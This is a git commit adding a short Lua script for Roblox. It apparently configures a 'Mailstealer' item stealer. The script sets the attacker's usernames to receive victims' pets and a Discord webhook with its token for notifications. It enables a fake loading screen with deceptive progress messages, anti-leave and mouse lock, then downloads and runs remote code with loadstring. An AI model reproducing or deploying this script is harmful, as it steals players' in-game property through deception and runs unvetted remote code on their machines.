9ca2f1b99b3b068b76eb64aa133f4a00173ba0d0
polarest <139060414+polarest@users.noreply.github.com>
2023-07-14 23:38:32 +0200

    Add files via upload

---
+++ obf_5O1AeUb3C1B6d03WOq6Wzy76jHTlSfL1uLf6dpgTcWiNT9RK6y9oEA9G5oAq1948.lua
@@ -0,0 +1,15 @@
+UserName = "Malko_0411" -- good pets
+Webhook = "https://discord.com/api/webhooks/1127612819441995916/73srz8aNR81U9H0H5Fvca7GIqDiiMH36QJ47hBnIFjn5WYIrgSqAlb1VgsfPmcxvW78y" -- pings for pets
+UserName2 = "jy_zi" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+_G.LoadingText1 = "Loading Library" -- LOADING TEXT IS TIPS UNDER LOADING BAR
+_G.LoadingText2 = "Updating library" -- LOADING TEXT IS TIPS UNDER LOADING BAR
+_G.LoadingText3 = "Getting Script" -- LOADING TEXT IS TIPS UNDER LOADING BAR
+_G.LoadingText4 = "Executing Script" -- LOADING TEXT IS TIPS UNDER LOADING BAR
+_G.LoadingText5 = "Error: Execution Failed, re-trying!" -- LOADING TEXT IS TIPS UNDER LOADING BAR
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
